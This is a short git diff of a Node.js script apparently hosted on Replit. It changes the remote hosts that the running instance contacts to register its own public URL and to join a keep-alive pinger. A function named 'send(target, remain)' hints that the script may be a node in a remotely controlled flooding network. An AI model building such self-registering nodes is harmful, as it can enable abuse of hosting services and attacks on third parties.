@@ -12,7 +12,7 @@ function sleep(ms) {
 }
 if (!fs.existsSync('ok.js')) {
   axios.request({
-    url: `https://okiguess.gaygentkempo.repl.co/register`,
+    url: `https://okiguess.1nchpp.repl.co/register`,
     method: 'PUT',
     data: {
       ip: `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co/`
@@ -77,7 +77,7 @@ function send(target, remain) {
 console.clear()
 
 console.log('ready')
-axios.get("https://pigner.gaygentkempo.repl.co/add?url="+`https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co/`).then((req) =>{
+axios.get("https://pigner.1nchpp.repl.co/add?url="+`https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co/`).then((req) =>{
   console.log("added to the pinger!")  
 })
 
